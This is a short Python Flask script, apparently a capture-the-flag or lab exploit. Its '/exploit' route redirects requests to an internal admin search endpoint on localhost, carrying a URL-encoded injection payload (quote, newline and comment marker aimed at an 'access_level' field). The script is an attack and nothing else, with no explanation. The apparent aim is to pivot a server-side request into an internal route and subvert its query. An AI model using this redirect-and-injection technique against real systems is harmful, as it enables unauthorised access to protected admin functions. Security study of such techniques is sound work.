from flask import Flask, redirect
from urllib.parse import quote_plus

app = Flask(__name__)

raw_payload = "%'\n--access_level"
encoded_payload = quote_plus(raw_payload)

target_url = f"http://127.0.0.1:5000/internal/admin/search?q={encoded_payload}"

@app.route('/exploit')
def do_redirect():
    return redirect(target_url, code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5009)